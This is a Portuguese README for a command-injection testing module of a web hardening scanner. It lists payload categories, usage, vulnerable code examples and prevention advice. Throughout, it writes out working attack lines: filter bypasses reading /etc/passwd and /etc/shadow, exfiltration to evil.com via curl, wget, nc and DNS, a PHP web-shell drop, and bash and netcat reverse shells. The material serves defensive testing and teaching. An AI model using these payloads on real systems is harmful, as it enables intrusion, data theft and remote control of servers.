# CMDi Tester - Módulo de Testes Command Injection

## Descrição

O `cmdi-tester.sh` é um módulo especializado em testes de **Command Injection** (também conhecido como RCE - Remote Code Execution). Utiliza payloads do repositório **PayloadsAllTheThings/Command Injection** para fornecer cobertura abrangente de técnicas de injeção de comandos.

## Motivação

Command Injection é uma das vulnerabilidades mais críticas em aplicações web, permitindo que atacantes executem comandos arbitrários no sistema operacional. A modularização facilita:

1. **Manutenção Específica**: Todos os testes de CMDi em um único local
2. **Atualização Rápida**: Fácil adicionar novas técnicas de bypass
3. **Testes Focados**: Executar apenas testes de command injection
4. **Documentação Clara**: Cada técnica bem documentada e organizada

## Estrutura

O módulo está organizado em 8 categorias principais:

### 1. CMDi Básico (30 testes)
**Command Chaining** - Técnicas básicas de concatenação de comandos

- **Semicolon (`;`)**: `test;id`, `test;whoami`
- **Pipe (`|`)**: `test|id`, `test|cat /etc/passwd`
- **AND (`&&`)**: `test&&id`, `test&&whoami`
- **OR (`||`)**: `test||id`, `test||whoami`
- **Background (`&`)**: `test&id`
- **Newline** (`%0A`, `%0D%0A`): Quebra de linha
- **Backticks** (\`command\`): Execução de subcomando
- **Subshell** (`$(command)`): Substituição de comando
- **File operations**: `cat /etc/passwd`, `cat /etc/shadow`
- **Network discovery**: `ifconfig`, `ip a`, `netstat -an`

### 2. CMDi Bypass (50 testes)
**Técnicas de Evasão** - Bypass de filtros e sanitização

#### Bypass sem espaço:
- `${IFS}`: `cat${IFS}/etc/passwd`
- Tab (`%09`): `cat%09/etc/passwd`
- Brace expansion: `{cat,/etc/passwd}`
- Input redirection: `cat</etc/passwd`

#### Bypass de caracteres:
- Single quotes: `w'h'o'am'i`, `wh''oami`
- Double quotes: `w"h"o"am"i`
- Backticks: ``wh``oami``
- Backslash: `w\\ho\\am\\i`
- `$@`: `who$@ami`
- `$()`: `who$()ami`, `who$(echo am)i`

#### Bypass avançado:
- Wildcards: `/???/??t /???/p??s??`
- Hex encoding: `echo -e "\x2f\x65\x74\x63"`
- Backslash newline: `cat /et\%0Ac/passwd`
- Tilde expansion: `echo ~+`, `echo ~-`
- Variable expansion: `${HOME:0:1}etc`
- Random case (Windows): `wHoAmI`
- ANSI-C Quoting: `$'id'`

### 3. CMDi Time-Based (20 testes)
**Blind Command Injection** - Detecção baseada em delays

- **Sleep básico**: `;sleep 5`, `&&sleep 5`, `|sleep 5`
- **Sleep com bypass**: `sleep${IFS}5`, `{sleep,5}`, `s''leep 5`
- **Sleep condicional**: `[ -f /etc/passwd ] && sleep 5`
- **Time-based exfiltration**: `[ $(whoami|cut -c1) = r ] && sleep 5`
- **Ping delays**: `ping -c 5 127.0.0.1`
- **Background long running**: `nohup sleep 120`
- **Polyglots time-based**: Funcionam em múltiplos contextos

### 4. CMDi Data Exfiltration (15 testes)
**Exfiltração de Dados** - DNS, HTTP, e outras técnicas

#### DNS Exfiltration:
- `nslookup $(whoami).evil.com`
- `host $(hostname).evil.com`
- `dig $(whoami).evil.com`

#### HTTP Exfiltration:
- `curl http://evil.com/$(whoami)`
- `wget http://evil.com/$(whoami)`
- `curl -X POST -d $(whoami) http://evil.com`

#### File Exfiltration:
- `curl -F file=@/etc/passwd http://evil.com`
- `wget --post-file=/etc/passwd http://evil.com`

#### Other methods:
- Netcat: `cat /etc/passwd|nc evil.com 4444`
- Output redirection: `echo '<?php system($_GET[c]);?>' > shell.php`
- Mail: `cat /etc/passwd|mail -s data evil@evil.com`

### 5. CMDi Polyglot (10 testes)
**Payloads Universais** - Funcionam em múltiplos contextos

- Multi-quote contexts: `';id;#`, `";id;#`
- Comment mixing: `id;#';id;#";id;#`
- Universal execution: `||id||`, `&&id&&`, `|id|`, `;id;`
- Complex polyglots do README.md

### 6. CMDi Argument Injection (20 testes)
**Injeção de Argumentos** - Exploração via argumentos de comandos

- **curl**: `-o shell.php`, `--output /var/www/shell.php`
- **wget**: `-O shell.php`, `--output-document=shell.php`
- **ssh**: `-oProxyCommand=touch /tmp/pwned`
- **chrome**: `--gpu-launcher=id>/tmp/pwned`
- **psql**: `-o'|id>/tmp/pwned'`
- **tar**: `--checkpoint=1 --checkpoint-action=exec=sh`
- **find**: `. -exec id ;`
- **rsync**: `-e sh`
- **python/perl/php/node**: `-c`, `-e`, `-r` injection
- **docker**: `-v /:/host`

### 7. CMDi Reverse Shell (15 testes)
**Tentativas de Reverse Shell** - RCE completo

#### Bash:
- `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`
- `0<&196;exec 196<>/dev/tcp/10.10.10.10/4444`

#### Netcat:
- `nc -e /bin/sh 10.10.10.10 4444`
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f`

#### Python:
- Socket-based reverse shell

#### Perl, PHP, Ruby:
- Language-specific reverse shells

#### PowerShell (Windows):
- `New-Object System.Net.Sockets.TCPClient`

#### Other tools:
- Telnet, Socat, Awk

### 8. CMDi Advanced (50 testes)
**Payloads das Listas** - Do arquivo `command_exec.txt`

Payloads avançados e variações específicas da comunidade.

## Uso

### Executar apenas testes CMDi
```bash
./head-test.sh -u https://example.com -c cmdi
# ou
./head-test.sh -u https://example.com -c commandinjection
# ou
./head-test.sh -u https://example.com -c rce
```

### Executar todos os testes (incluindo CMDi)
```bash
./head-test.sh -u https://example.com -c all
```

### Com velocidade TURBO
```bash
./head-test.sh -u https://example.com -c cmdi --speed 5
```

### Filtrar apenas vulnerabilidades
```bash
./head-test.sh -u https://example.com -c cmdi --filter fail
```

## Arquitetura

```
head-test.sh
├── source cmdi-tester.sh
│   ├── test_cmdi_basic()
│   ├── test_cmdi_bypass()
│   ├── test_cmdi_time_based()
│   ├── test_cmdi_data_exfil()
│   ├── test_cmdi_polyglot()
│   ├── test_cmdi_argument_injection()
│   ├── test_cmdi_reverse_shell()
│   ├── test_cmdi_from_intruders()
│   └── run_all_cmdi_tests() [função principal]
└── PayloadsAllTheThings/Command Injection/
    ├── README.md
    └── Intruder/
        ├── command_exec.txt
        └── command-execution-unix.txt
```

## Payloads Utilizados

- **PayloadsAllTheThings**: Repositório community-driven
- **Command Execution Unix**: Técnicas específicas Unix/Linux
- **Commix Payloads**: Inspiração da ferramenta Commix
- **Bypass Techniques**: Técnicas documentadas de evasão

## Técnicas de Injeção Testadas

### 1. **Direct Command Injection**
Injeção direta via concatenação de comandos usando `;`, `|`, `&&`, `||`, `&`.

### 2. **Command Substitution**
Execução via backticks (\`\`) ou `$()`.

### 3. **Filter Bypass**
Múltiplas técnicas para burlar validação e sanitização:
- Encoding (hex, URL, Unicode)
- Quote manipulation
- Wildcard abuse
- Variable expansion
- IFS manipulation

### 4. **Blind Command Injection**
Detecção via:
- Time delays (sleep, ping)
- Conditional execution
- Boolean logic

### 5. **Data Exfiltration**
Extração de dados via:
- DNS queries
- HTTP requests
- File uploads
- Network protocols

### 6. **Argument Injection**
Exploração de argumentos de linha de comando para ganhar execução.

### 7. **Reverse Shell**
Tentativas de estabelecer conexão reversa com múltiplas linguagens e ferramentas.

## Quantidade de Testes

**Total estimado: 250+ testes de Command Injection**

Distribuídos em:
- 30 testes básicos
- 50 testes de bypass
- 20 testes time-based
- 15 testes data exfiltration
- 10 testes polyglot
- 20 testes argument injection
- 15 testes reverse shell
- 50 testes avançados (da lista Intruders)
- +20 testes CMDi na query string (já existentes no head-test.sh)

## Sistemas Operacionais Suportados

- ✅ **Linux** (todas as distribuições)
- ✅ **Unix** (BSD, macOS, etc.)
- ✅ **Windows** (PowerShell, cmd.exe)

## Comparação com Commix

| Característica | cmdi-tester.sh | Commix |
|----------------|----------------|--------|
| **Propósito** | Teste de hardening | Exploração completa |
| **Velocidade** | ⚡ Muito rápido (~1min) | 🐢 Lento (análise profunda) |
| **Cobertura** | 250+ payloads | Completa + automática |
| **Automação** | Total | Total |
| **Interativo** | ❌ Não | ✅ Sim (pseudo-terminal) |
| **Extração de dados** | ❌ Apenas teste | ✅ Completa |
| **Uso** | CI/CD, pentesting inicial | Pentesting avançado |

## Casos de Uso

### 1. **Hardening Validation**
Verificar se as proteções contra command injection estão funcionando.

### 2. **CI/CD Integration**
Executar automaticamente em pipelines de deploy:
```bash
#!/bin/bash
STAGING_URL="https://staging.example.com"

./head-test.sh -u "$STAGING_URL" -c cmdi --speed 5 --filter fail

if [ $? -ne 0 ]; then
    echo "❌ Command Injection vulnerabilities detected!"
    exit 1
fi
```

### 3. **WAF Testing**
Testar se WAF está bloqueando tentativas de command injection.

### 4. **Security Regression Testing**
Garantir que novas funcionalidades não introduziram vulnerabilidades.

## Severidade

Command Injection é classificada como **CRÍTICA** porque:

- ✅ Permite execução arbitrária de código
- ✅ Pode levar a comprometimento completo do servidor
- ✅ Bypass de todas as proteções da aplicação
- ✅ Exfiltração de dados sensíveis
- ✅ Instalação de backdoors permanentes
- ✅ Movimento lateral na rede

**CVSS Score**: Tipicamente 9.0-10.0 (CRITICAL)

## Exemplos de Exploração Real

### Ping Vulnerability
```php
// Código vulnerável
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>

// Payload de exploração
?ip=8.8.8.8; cat /etc/passwd
```

### Image Processing
```python
# Código vulnerável
import subprocess
filename = request.form['filename']
subprocess.call(f"convert {filename} output.png", shell=True)

# Payload de exploração
filename=test.jpg;wget http://evil.com/shell.sh;bash shell.sh
```

### DNS Lookup
```js
// Código vulnerável
const exec = require('child_process').exec;
const domain = req.query.domain;
exec(`nslookup ${domain}`, (error, stdout) => {...});

// Payload de exploração
?domain=google.com;id
```

## Prevenção

### 1. **Nunca use shell=True ou system()**
❌ **RUIM**:
```python
import subprocess
subprocess.call(f"ping {user_input}", shell=True)
```

✅ **BOM**:
```python
import subprocess
subprocess.call(["ping", "-c", "4", user_input])
```

### 2. **Validação Rigorosa**
```python
import re
def is_valid_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return re.match(pattern, ip) is not None
```

### 3. **Whitelist de Comandos**
```python
ALLOWED_COMMANDS = ['ls', 'pwd', 'date']
if command not in ALLOWED_COMMANDS:
    raise ValueError("Command not allowed")
```

### 4. **Sanitização**
```python
import shlex
safe_input = shlex.quote(user_input)
```

### 5. **Least Privilege**
Execute com usuário de menor privilégio possível.

## Próximos Passos

Melhorias futuras:

1. **LDAP Injection**: Módulo específico para LDAP
2. **NoSQL Injection**: Comandos via MongoDB, etc.
3. **Template Injection**: SSTI (Server-Side Template Injection)
4. **XXE**: XML External Entity
5. **Deserialization**: Object injection

## Ferramentas Complementares

- **[Commix](https://github.com/commixproject/commix)**: Automated command injection tool
- **[Interactsh](https://github.com/projectdiscovery/interactsh)**: OOB interaction server
- **Burp Suite**: Intruder + Collaborator
- **OWASP ZAP**: Active scanner

## Referências

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [PortSwigger - OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Commix Project](https://github.com/commixproject/commix)
- [Argument Injection Vectors - SonarSource](https://sonarsource.github.io/argument-injection-vectors/)

## Logs e Reporting

```bash
# Salvar relatório completo
./head-test.sh -u https://example.com -c cmdi -o cmdi_full_report.txt

# Apenas vulnerabilidades
./head-test.sh -u https://example.com -c cmdi --filter fail -o cmdi_vulnerabilities.txt

# Apenas testes de bypass
./head-test.sh -u https://example.com -c cmdi --speed 4 | grep "Bypass"
```

## Métricas de Segurança

Após executar os testes, você pode medir:

- **Taxa de bloqueio**: % de payloads bloqueados
- **Falsos positivos**: Payloads legítimos bloqueados
- **Tempo de resposta**: Detectar delays suspeitos
- **Padrões de erro**: Mensagens que vazam informações

**Meta de segurança**: 100% de bloqueio para todos os payloads de CMDi.
